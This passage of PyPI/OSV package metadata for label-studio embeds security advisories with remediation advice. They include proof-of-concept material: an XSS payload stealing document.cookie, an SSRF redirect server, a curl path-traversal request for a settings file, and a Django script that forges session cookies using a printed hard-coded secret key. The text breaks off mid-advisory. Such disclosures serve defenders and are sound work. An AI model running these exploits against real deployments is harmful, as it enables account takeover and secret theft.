complete](https://github.com/HumanSignal/label-studio/assets/3943358/f2f62774-1fa6-4456-9e6f-8fa1ca0a2d2e)\n\nThe following are the contents of the files used in the PoC\n```\n{\n  \"data\": {\n    \"prompt\": \"labelstudio universe image\",\n    \"images\": [\n      {\n        \"value\": \"id123#0\",\n        \"style\": \"margin: 5px\",\n        \"html\": \"<img width='400' src='https://labelstud.io/_astro/images-tab.64279c16_ZaBSvC.avif' onload=alert(document.cookie)>\"\n      }\n    ]\n  }\n}\n```\n\n3. Select the text-to-image generation labeling template of Ranking and scoring\n![3  Select the text-to-image generation labelling template for Ranking and scoring](https://github.com/HumanSignal/label-studio/assets/3943358/f227f49c-a718-4738-bc2a-807da4f97155)\n![5  save](https://github.com/HumanSignal/label-studio/assets/3943358/9b529f8a-8e99-4bb0-bdf6-bb7a95c9b75d)\n\n4. Select a task\n![4  Select a task](https://github.com/HumanSignal/label-studio/assets/3943358/71856b7a-2b1f-44ea-99ab-fc48bc20caa7)\n\n5. Check that the script is running\n![5  Check that the script is running](https://github.com/HumanSignal/label-studio/assets/3943358/e396ae7b-a591-4db7-afe9-5bab30b48cb9)\n\n### Impact\nMalicious scripts can be injected into the code, and when linked with vulnerabilities such as CSRF, it can cause even greater damage. In particular, It can become a source of further attacks, especially when linked to social engineering.\n","fixed_in":["1.11.0"],"id":"GHSA-6xv9-957j-qfhg","link":"https://osv.dev/vulnerability/GHSA-6xv9-957j-qfhg","source":"osv","summary":null,"withdrawn":null}]},"0.4.7":{"info":{"author":"Heartex","author_email":"hello@heartex.ai","bugtrack_url":null,"classifiers":["License :: OSI Approved :: MIT License","Operating System :: OS Independent","Programming Language :: Python :: 3"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://github.com/heartexlabs/label-studio","keywords":"","license":"","maintainer":"","maintainer_email":"","name":"label-studio","package_url":"https://pypi.org/project/label-studio/","platform":"","project_url":"https://pypi.org/project/label-studio/","project_urls":{"Homepage":"https://github.com/heartexlabs/label-studio"},"provides_extra":null,"release_url":"https://pypi.org/project/label-studio/0.4.7/","requires_dist":["appdirs (==1.4.3)","attrs (==19.1.0)","blis (==0.4.1)","certifi (==2019.11.28)","chardet (==3.0.4)","Click (==7.0)","cymem (==2.0.3)","Flask (==1.1.1)","idna (==2.8)","itsdangerous (==1.1.0)","Jinja2 (==2.10.3)","lxml (>=4.2.5)","MarkupSafe (==1.1.1)","mixpanel (==4.4.0)","numpy (==1.17.4)","python-dateutil (==2.8.1)","python-json-logger (==0.1.11)","pytz (==2019.3)","requests (==2.22.0)","six (==1.12.0)","srsly (==0.2.0)","tqdm (==4.40.2)","urllib3 (==1.25.7)","wasabi (==0.4.2)","Werkzeug (==0.16.0)","orjson (>=2.0.11)","rarfile (>=3.1)","flask-api (>=2.0)","pandas (>=0.24.0)","jsonschema (>=3.2.0)","xmljson (==0.2.0)","label-studio-converter (>=0.0.10.post2)"],"requires_python":">=3.5","summary":"Label Studio annotation tool","version":"0.4.7","yanked":false,"yanked_reason":null},"last_serial":25820833,"urls":[{"comment_text":"","digests":{"blake2b_256":"f9c48abce0df1e167fe2dc6bed95ceb2017408769a685ba0e0e0f3e40f5783d9","md5":"589e8946b1cf83f5087106153f37d3d8","sha256":"85556e695b8e98b5b9d4ab9ddd315b2b23d4fa852bea91516c9f5c85427e1dc5"},"downloads":-1,"filename":"label_studio-0.4.7-py3-none-any.whl","has_sig":false,"md5_digest":"589e8946b1cf83f5087106153f37d3d8","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.5","size":7349654,"upload_time":"2020-02-25T21:06:26","upload_time_iso_8601":"2020-02-25T21:06:26.370134Z","url":"https://files.pythonhosted.org/packages/f9/c4/8abce0df1e167fe2dc6bed95ceb2017408769a685ba0e0e0f3e40f5783d9/label_studio-0.4.7-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"362406b00162da48e192b460b15248cdb8a2a9e119c93f82f2577e8f9b50e461","md5":"327803b8d0576c1198c73b8edc93f309","sha256":"89a4b9d351b204bab89e8aa74ffdf5c1e9b06645218a907dd053666e5aaee475"},"downloads":-1,"filename":"label-studio-0.4.7.tar.gz","has_sig":false,"md5_digest":"327803b8d0576c1198c73b8edc93f309","packagetype":"sdist","python_version":"source","requires_python":">=3.5","size":7279281,"upload_time":"2020-02-25T21:06:30","upload_time_iso_8601":"2020-02-25T21:06:30.178782Z","url":"https://files.pythonhosted.org/packages/36/24/06b00162da48e192b460b15248cdb8a2a9e119c93f82f2577e8f9b50e461/label-studio-0.4.7.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF. This issue is fixed in version 1.6.0.","fixed_in":["1.6.0"],"id":"GHSA-pc6f-259w-w3j6","link":"https://osv.dev/vulnerability/GHSA-pc6f-259w-w3j6","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF.","fixed_in":["1.5.0.post0"],"id":"PYSEC-2022-300","link":"https://osv.dev/vulnerability/PYSEC-2022-300","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47116"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to [`1.11.0`](https://github.com/HumanSignal/label-studio/releases/tag/1.11.0) and was tested on version `1.8.2`.\n\n# Overview\n\nLabel Studio's SSRF protections that can be enabled by setting the `SSRF_PROTECTION_ENABLED` environment variable can be bypassed to access internal web servers. This is because the current SSRF validation is done by executing a single DNS lookup to verify that the IP address is not in an excluded subnet range. This protection can be bypassed by either using HTTP redirection or performing a [DNS rebinding attack](https://en.wikipedia.org/wiki/DNS_rebinding).\n\n# Description\n\nThe following `tasks_from_url` method in [`label_studio/data_import/uploader.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_import/uploader.py#L127-L155) performs the SSRF validation (`validate_upload_url`) before sending the request.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1]\n\n        validate_upload_url(url, block_local_urls=settings.SSRF_PROTECTION_ENABLED)\n        # Reason for #nosec: url has been validated as SSRF safe by the\n        # validation check above.\n        response = requests.get(\n            url, verify=False, headers={'Accept-Encoding': None}\n        )  # nosec\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(\n            user, project, SimpleUploadedFile(filename, file_content)\n        )\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(\n            project, file_upload_ids\n        )\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n\nThe `validate_upload_url` code in [`label_studio/core/utils/io.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/core/utils/io.py#L174-L209) is shown below.\n\n```python\ndef validate_upload_url(url, block_local_urls=True):\n    \"\"\"Utility function for defending against SSRF attacks. Raises\n        - InvalidUploadUrlError if the url is not HTTP[S], or if block_local_urls is enabled\n          and the URL resolves to a local address.\n        - LabelStudioApiException if the hostname cannot be resolved\n\n    :param url: Url to be checked for validity/safety,\n    :param block_local_urls: Whether urls that resolve to local/private networks should be allowed.\n    \"\"\"\n\n    parsed_url = parse_url(url)\n\n    if parsed_url.scheme not in ('http', 'https'):\n        raise InvalidUploadUrlError\n\n    domain = parsed_url.host\n    try:\n        ip = socket.gethostbyname(domain)\n    except socket.error:\n        from core.utils.exceptions import LabelStudioAPIException\n        raise LabelStudioAPIException(f\"Can't resolve hostname {domain}\")\n\n    if not block_local_urls:\n        return\n\n    if ip == '0.0.0.0':  # nosec\n        raise InvalidUploadUrlError\n    local_subnets = [\n        '127.0.0.0/8',\n        '10.0.0.0/8',\n        '172.16.0.0/12',\n        '192.168.0.0/16',\n    ]\n    for subnet in local_subnets:\n        if ipaddress.ip_address(ip) in ipaddress.ip_network(subnet):\n            raise InvalidUploadUrlError\n```\n\nThe issue here is the SSRF validation is only performed before the request is sent, and does not validate the destination IP address. Therefore, an attacker can either redirect the request or perform a DNS rebinding attack to bypass this protection.\n\n# Proof of Concept\n\nBoth the HTTP redirection and DNS rebinding methods for bypassing Label Studio's SSRF protections are explained below.\n\n### HTTP Redirection\n\nThe python `requests` module automatically follows HTTP redirects (eg. response code `301` and `302`). Therefore, an attacker could use a URL shortener (eg. `https://www.shorturl.at/`) or host the following Python code on an external server to redirect request from a Label Studio server to an internal web server.\n\n```python\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass RedirectHandler(BaseHTTPRequestHandler):\n\n    def do_GET(self):\n        self.send_response(301)\n        # skip first slash\n        self.send_header('Location', self.path[1:])\n        self.end_headers()\n\nHTTPServer((\"\", 8080), RedirectHandler).serve_forever()\n```\n\n### DNS Rebinding Attack\n\nDNS rebinding can bypass SSRF protections by resolving to an external IP address for the first resolution, but when the request is sent resolves to an internal IP address that is blocked. For an example, the domain `7f000001.030d1fd6.rbndr.us` will randomly switch between the IP address `3.13.31.214` that is not blocked to `127.0.0.1` which is not allowed.\n\n# Impact\n\nSSRF vulnerabilities pose a significant risk on cloud environments, since instance credentials are managed by internal web APIs. An attacker can bypass Label Studio's SSRF protections to access internal web servers and partially compromise the confidentiality of those internal servers.\n\n# Remediation Advice\n\n* Before saving any responses, validate the destination IP address is not in the deny list.\n* Consider blocking internal cloud API IP ranges to mitigate the risk of compromising cloud credentials.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.11.0"],"id":"GHSA-p59w-9gqw-wj8r","link":"https://osv.dev/vulnerability/GHSA-p59w-9gqw-wj8r","source":"osv","summary":null,"withdrawn":null},{"aliases":[],"details":"### Summary\nThe vulnerability resides on the Nginx config file:\nhttps://github.com/heartexlabs/label-studio/blob/53944e6bcede75ca5c102d655013f2e5238e85e6/deploy/default.conf#L119\n\nThe pattern on location /static indicates a popular misconfiguration on Nginx servers presented in 2018 originally by Orange Tsai. This vulnerability allows an attacker to use a single path traversal payload in the matched location to traverse one directory above. This vulnerability only happens due to the location /static directive not having a slash `/` at the end, the following code shows an example of a safe configuration:\n```nginx\nlocation /static/ {\n[...]\n```\nThe vulnerability works because Nginx will think that `/static../` is a directory that should also be aliased to the folder, allowing /static/../ to be reached. In Label Studio's case, this means all files on /label_studio/core/ are exposed.\n\nOf course, this means that only Label Studio instances that were deployed using the default nginx files introducted at Mar 31, 2021.\nThis is a very easy vulnerability to fix, and just a lesser-known configuration mistake on nginx files. It's very easy to happen because all is needed is for one slash to be missing. (Off-By-One)\n\n** Proof-of-Concept (Leaking Secret Keys): **\nExploiting this vulnerability usually depends on what's on the parent folder, in Label Studio's case the most interesting file I could find that's on there by default is /label_studio/core/ . We can fetch it by simply making a request to the traversed folder.\n```bash\n# Production Label Studio docker-compose running on localhost:8080\n/t/mydata [127]$ curl localhost:8080/static../settings/label_studio.py\n\"\"\"This file and its contents are licensed under the Apache License 2.0. Please see the included NOTICE for copyright information and LICENSE for a copy of the license.\n\"\"\"\nimport os\nimport pathlib\n\nfrom core.settings.base import *\n\nDJANGO_DB = get_env('DJANGO_DB', DJANGO_DB_SQLITE)\nDATABASES = {'default': DATABASES_ALL[DJANGO_DB]}\n\nMIDDLEWARE.append('organizations.middleware.DummyGetSessionMiddleware')\nMIDDLEWARE.append('core.middleware.UpdateLastActivityMiddleware')\nif INACTIVITY_SESSION_TIMEOUT_ENABLED:\n    MIDDLEWARE.append('core.middleware.InactivitySessionTimeoutMiddleWare')\n\nADD_DEFAULT_ML_BACKENDS = False\n\nLOGGING['root']['level'] = get_env('LOG_LEVEL', 'WARNING')\n\nDEBUG = get_bool_env('DEBUG', False)\n\nDEBUG_PROPAGATE_EXCEPTIONS = get_bool_env('DEBUG_PROPAGATE_EXCEPTIONS', False)\n\nSESSION_COOKIE_SECURE = False\n\nSESSION_ENGINE = \"django.contrib.sessions.backends.signed_cookies\"\n\nRQ_QUEUES = {}\n\nSENTRY_DSN = get_env(\n    'SENTRY_DSN',\n    'https://68b045ab408a4d32a910d339be8591a4@o227124.ingest.sentry.io/5820521'\n)\nSENTRY_ENVIRONMENT = get_env('SENTRY_ENVIRONMENT', 'opensource')\n\nFRONTEND_SENTRY_DSN = get_env(\n    'FRONTEND_SENTRY_DSN',\n    'https://5f51920ff82a4675a495870244869c6b@o227124.ingest.sentry.io/5838868')\nFRONTEND_SENTRY_ENVIRONMENT = get_env('FRONTEND_SENTRY_ENVIRONMENT', 'opensource')\n\nEDITOR_KEYMAP = json.dumps(get_env(\"EDITOR_KEYMAP\"))\n\nfrom label_studio import __version__\nfrom label_studio.core.utils import sentry\nsentry.init_sentry(release_name='label-studio', release_version=__version__)\n\n# we should do it after sentry init\nfrom label_studio.core.utils.common import collect_versions\nversions = collect_versions()\n\n# in Label Studio Community version, feature flags are always ON\nFEATURE_FLAGS_DEFAULT_VALUE = True\n# or if file is not set, default is using offline mode\nFEATURE_FLAGS_OFFLINE = get_bool_env('FEATURE_FLAGS_OFFLINE', True)\n\nfrom core.utils.io import find_file\nFEATURE_FLAGS_FILE = get_env('FEATURE_FLAGS_FILE', 'feature_flags.json')\nFEATURE_FLAGS_FROM_FILE = True\ntry:\n    from core.utils.io import find_node\n    find_node('label_studio', FEATURE_FLAGS_FILE, 'file')\nexcept IOError:\n    FEATURE_FLAGS_FROM_FILE = False\n\nSTORAGE_PERSISTENCE = get_bool_env('STORAGE_PERSISTENCE', True)\n```\n\n\n### Impact\nThe impact consists on leaking Django secret keys by default, with also greater risk being possible due to the vulnerability exposing the file located at /label_studio/core/settings/label_studio.py which contains the secret key for Django as well as possibly containing other secrets the user might put there. (If the administrator decides not to use environment variables for some variables)\n","fixed_in":["1.7.2"],"id":"GHSA-cpmr-mw4j-99r7","link":"https://osv.dev/vulnerability/GHSA-cpmr-mw4j-99r7","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47115"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2` and was tested on version `1.8.2`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) has a cross-site scripting (XSS) vulnerability that could be exploited when an authenticated user uploads a crafted image file for their avatar that gets rendered as a HTML file on the website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/functions.py#L18-L49) shows that the only verification check is that the file is an image by extracting the dimensions from the file.\n\n```python\n\ndef hash_upload(instance, filename):\n    filename = str(uuid.uuid4())[0:8] + '-' + filename\n    return settings.AVATAR_PATH + '/' + filename <3>\n\n\ndef check_avatar(files):\n    images = list(files.items())\n    if not images:\n        return None\n\n    filename, avatar = list(files.items())[0]  # get first file\n    w, h = get_image_dimensions(avatar) <1>\n    if not w or not h:\n        raise forms.ValidationError(\"Can't read image, try another one\")\n\n    # validate dimensions\n    max_width = max_height = 1200\n    if w > max_width or h > max_height:\n        raise forms.ValidationError('Please use an image that is %s x %s pixels or smaller.'\n                                    % (max_width, max_height))\n\n    # validate content type\n    main, sub = avatar.content_type.split('/') <2>\n    if not (main == 'image' and sub.lower() in ['jpeg', 'jpg', 'gif', 'png']):\n        raise forms.ValidationError(u'Please use a JPEG, GIF or PNG image.')\n\n    # validate file size\n    max_size = 1024 * 1024\n    if len(avatar) > max_size:\n        raise forms.ValidationError('Avatar file size may not exceed ' + str(max_size/1024) + ' kb')\n\n    return avatar\n```\n1. Attempts to get image dimensions to validate the uploaded avatar file is an image.\n2. Extracts the `Content-Type` from the upload `POST` request. A user can easily bypass this verification by changing the mimetype of the uploaded file to an allowed type (eg. `image/jpeg`).\n3. The file extension of the uploaded file is never validated and is saved to the filesystem.\n\n[Label Studio serves avatar images using Django's built-in `serve` view](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/urls.py#L25-L26), which is [not secure for production use according to Django's documentation](https://docs.djangoproject.com/en/4.2/ref/views/#serving-files-in-development).\n\n```python\n    re_path(r'^data/' + settings.AVATAR_PATH + '/(?P<path>.*)$', serve,\n            kwargs={'document_root': join(settings.MEDIA_ROOT, settings.AVATAR_PATH)}),\n```\n\nThe issue with the Django `serve` view is that it determines the `Content-Type` of the response by the file extension in the URL path. Therefore, an attacker can upload an image that contains malicious HTML code and name the file with a `.html` extension to be rendered as a HTML page. The only file extension validation is performed on the client-side, which can be easily bypassed.\n\n# Proof of Concept\n\nBelow are the steps to reproduce this issue and execute JavaScript code in the context of the Label Studio website.\n\n1. Using any JPEG or PNG image, add in the comment field in the metadata the HTML code `<script>alert(document.domain)</script>`. This can be done using the `exiftool` command as shown below that was used to create the following image.\n\n```bash\nexiftool -Comment='<script>alert(document.domain)</script>' penguin.jpg\n```\n\n![xss-penguin](https://user-images.githubusercontent.com/139727151/266989884-c2cd9b4f-f374-416e-a468-acf41f52e088.jpg)\n\n2. On Label Studio, navigate to account & settings page and intercept the upload request of the avatar image using a tool such as Burp Suite. Modify the filename in the request to have a `.html` extension.\n\n3. Right click the image on the avatar profile and copy the URL. Send this to a victim and it will display an alert box with the host name of the Label Studio instance as shown below.\n\n![xss-alert](https://user-images.githubusercontent.com/139727151/266989952-6fb74c6e-9961-447c-a602-5a6f36627ae6.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* Validate the file extension on the server side, not in client-side code.\n* Remove the use of Django's `serve` view and implement a secure controller for viewing uploaded avatar images.\n* Consider saving file content in the database rather than on the filesystem to mitigate against other file related vulnerabilities.\n* Avoid trusting user controlled inputs.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.9.2"],"id":"GHSA-q68h-xwq5-mm7x","link":"https://osv.dev/vulnerability/GHSA-q68h-xwq5-mm7x","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-23633"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.10.1` and was tested on version `1.9.2.post0`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) had a remote import feature allowed users to import data from a remote web source, that was downloaded and could be viewed on the website. This feature could had been abused to download a HTML file that executed malicious JavaScript code in the context of the Label Studio website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146) showed that is a URL passed the SSRF verification checks, the contents of the file would be downloaded using the filename in the URL.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1] <1>\n\n        response = ssrf_safe_get(\n            url, verify=project.organization.should_verify_ssl_certs(), stream=True, headers={'Accept-Encoding': None}\n        )\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(user, project, SimpleUploadedFile(filename, file_content))\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(project, file_upload_ids)\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n1. The file name that was set was retrieved from the URL.\n\nThe downloaded file path could then be retrieved by sending a request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]` where `{project_id}` was the ID of the project and `{download_id}` was the ID of the downloaded file. Once the downloaded file path was retrieved by the previous API endpoint, the [following code snippet](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62) demonstrated that the `Content-Type` of the response was determined by the file extension, since `mimetypes.guess_type` guesses the `Content-Type` based on the file extension.\n\n```python\nclass UploadedFileResponse(generics.RetrieveAPIView):\n    permission_classes = (IsAuthenticated,)\n\n    @swagger_auto_schema(auto_schema=None)\n    def get(self, *args, **kwargs):\n        request = self.request\n        filename = kwargs['filename']\n        # XXX needed, on windows os.path.join generates '\\' which breaks FileUpload\n        file = settings.UPLOAD_DIR + ('/' if not settings.UPLOAD_DIR.endswith('/') else '') + filename\n        logger.debug(f'Fetch uploaded file by user {request.user} => {file}')\n        file_upload = FileUpload.objects.filter(file=file).last()\n\n        if not file_upload.has_permission(request.user):\n            return Response(status=status.HTTP_403_FORBIDDEN)\n\n        file = file_upload.file\n        if file.storage.exists(file.name):\n            content_type, encoding = mimetypes.guess_type(str(file.name)) <1>\n            content_type = content_type or 'application/octet-stream'\n            return RangedFileResponse(request, file.open(mode='rb'), content_type=content_type)\n        else:\n            return Response(status=status.HTTP_404_NOT_FOUND)\n```\n1. Determines the `Content-Type` based on the extension of the uploaded file by using `mimetypes.guess_type`.\n\nSince the `Content-Type` was determined by the file extension of the downloaded file, an attacker could import in a `.html` file that would execute JavaScript when visited.\n\n# Proof of Concept\n\nBelow were the steps to recreate this issue:\n\n1. Host the following HTML proof of concept (POC) script on an external website with the file extension `.html` that would be downloaded to the Label Studio website.\n\n```html\n<html>\n    <body>\n        <h1>Data Import XSS</h1>\n        <script>\n            alert(document.domain);\n        </script>\n    </body>\n</html>\n```\n\n2. Send the following `POST` request to download the HTML POC to the Label Studio and note the returned ID of the downloaded file in the response. In the following POC the `{victim_host}` is the address and port of the victim Label Studio website (eg. `labelstudio.com:8080`), `{project_id}` is the ID of the project where the data would be imported into, `{cookies}` are session cookies and `{evil_site}` is the website hosting the malicious HTML file (named `xss.html` in the following example).\n\n```http\nPOST /api/projects/{project_id}/import?commit_to_project=false HTTP/1.1\nHost: {victim_host}\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\ncontent-type: application/x-www-form-urlencoded\nContent-Length: 43\nConnection: close\nCookie: {cookies}\nPragma: no-cache\nCache-Control: no-cache\n\nurl=https://{evil_site}/xss.html\n```\n\n3. To retrieve the downloaded file path could be retrieved by sending a `GET` request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]`, where `{download_id}` is the ID of the file download from the previous step.\n\n4. Send your victim a link to `/data/{file_path}`, where `{file_path}` is the path of the downloaded file from the previous step. The following screenshot demonstrated executing the POC JavaScript code by visiting `/data/upload/1/cfcfc340-xss.html`.\n\n![xss-import-alert](https://user-images.githubusercontent.com/139727151/282223222-d8f9132c-838e-4aa6-9c03-a2bc83b4a409.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* For all user provided files that are downloaded by Label Studio, set the `Content-Security-Policy: sandbox;` response header when viewed on the site. The `sandbox` directive restricts a page's actions to prevent popups, execution of plugins and scripts and enforces a `same-origin` policy ([documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox)).\n* Restrict the allowed file extensions that could be downloaded.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.10.1"],"id":"GHSA-fq23-g58m-799r","link":"https://osv.dev/vulnerability/GHSA-fq23-g58m-799r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-43791"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability was found to affect versions before `1.8.2`, where a patch was introduced.\n\n# Overview\n\nIn [Label Studio version 1.8.1](https://github.com/HumanSignal/label-studio/tree/1.8.1), a hard coded Django `SECRET_KEY` was set in the application settings. The Django `SECRET_KEY` is used for signing session tokens by the web application framework, and should never be shared with unauthorised parties.\n\nHowever, the Django framework inserts a `_auth_user_hash` claim in the session token that is a HMAC hash of the account's password hash. That claim would normally prevent forging a valid Django session token without knowing the password hash of the account. However, any authenticated user can exploit an Object Relational Mapper (ORM) Leak vulnerability in Label Studio to leak the password hash of any account on the platform, which is reported as a separate vulnerability. An attacker can exploit the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) and forge session tokens for all users on Label Studio using the hard coded `SECRET_KEY`.\n\n# Description\n\nBelow is the code snippet of the Django settings file at [`label_studio/core/settings/base.py`](https://github.com/HumanSignal/label-studio/blob/1.8.1/label_studio/core/settings/base.py#L108).\n\n```python\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = '$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n'\n```\n\nThis secret is hard coded across all instances of Label Studio.\n\n# Proof of Concept\n\nBelow are the steps that an attacker could do to forge a session token of any account on Label Studio:\n\n1. Exploit the ORM Leak vulnerability (patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to retrieve the full password hash that will be impersonated. For this example, a session token will be forged for an account with the email `ghostccamm@testvm.local` with the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=` that was retrieved.\n\n2. Create a new Django project with an empty application. In `cookieforge/cookieforge/settings.py` set the `SECRET_KEY` to `$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n`. Create a management command with the following code that will be used to create forged session tokens.\n\n```python\nfrom typing import Any\nfrom django.core.management.base import  BaseCommand, CommandParser\nfrom django.core import signing\nfrom django.utils.crypto import salted_hmac\nfrom django.conf import settings\nimport time, uuid\n\nclass Command(BaseCommand):\n    help = \"Forge a users session cookie on Label Studio\"\n\n    def add_arguments(self, parser: CommandParser) -> None:\n        parser.add_argument(\n            '-o', '--organisation',\n            help='Organisation ID to access',\n            default=1,\n            type=int\n        )\n\n        parser.add_argument(\n            'user_id',\n            help='The User ID of the victim you want to impersonate',\n            type=str\n        )\n\n        parser.add_argument(\n            'user_hash',\n            help='The password hash the user you want to impersonate'\n        )\n\n    def handle(self, *args: Any, **options: Any) -> str | None:\n        key = settings.SECRET_KEY\n        # Creates the _auth_user_hash HMAC of the victim's password hash\n        auth_user_hash = salted_hmac(\n            'django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash',\n            options['user_hash'],\n            secret=key,\n            algorithm=\"sha256\"\n        ).hexdigest()\n\n        session_dict = {\n            'uid': str(uuid.uuid4()), \n            'organization_pk': options['organisation'], \n            'next_page': '/projects/', \n            'last_login': time.time(), \n            '_auth_user_id': options['user_id'], \n            '_auth_user_backend': \n            'django.contrib.auth.backends.ModelBackend', \n            '_auth_user_hash': auth_user_hash, \n            'keep_me_logged_in': True, \n            '_session_expiry': 600\n        }\n\n        # Creates a forged session token\n        session_token = signing.dumps(\n            session_dict,\n            key=key,\n            salt=\"django.contrib.sessions.backends.signed_cookies\",\n            compress=True\n        )\n\n        self.stdout.write(\n            self.style.SUCCESS(f\"session token: {session_token}\")\n        )\n```\n\n3. Next run the following command replacing the `{user_id}` with the user ID of the account you want to the impersonate and `{user_hash}` with the victim's password hash. Copy the session token that is printed.\n\n```python\npython3 manage.py forgecookie {user_id} '{user_hash}'\n```\n\n4. Change the `sessionid` cookie on the browser and refresh the page. Observe being authenticated as the victim user.\n\n# Impact\n\nThis vulnerability can be chained with the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to impersonate any account on Label Studio. An attacker could exploit these vulnerabilities to escalate their privileges from a low privilege user to a Django Super Administrator user.\n\n# Remediation Advice\n\nIt is important to note that the hard coded `SECRET_KEY` has already been removed in Label Studio versions `>=1.8.2`. However, there has not been any public disclosure about the use of the hard coded secret key and users have not been informed about the security vulnerability.\n\nWe recommend that Human Signal to release a public disclosure about the hard coded `SECRET_KEY` to encourage users to patch to a version `>=1.8.2` to mitigate the likelihood of an attacker exploiting these vulnerabilities to impersonate all accounts on the platform.\n\n# Discovered\n- August 2023, Robert Schuh, @robbilie\n- August 2023, Alex Brown, elttam","fixed_in":["1.8.2"],"id":"GHSA-f475-x83m-rx5m","link":"https://osv.dev/vulnerability/GHSA-f475-x83m-rx5m","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47117"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2post0` and was tested on version `1.8.2`.\n\n# Overview\n\nIn all current versions of [Label Studio](https://github.com/HumanSignal/label-studio), the application allows users to insecurely set filters for filtering tasks. An attacker can construct a 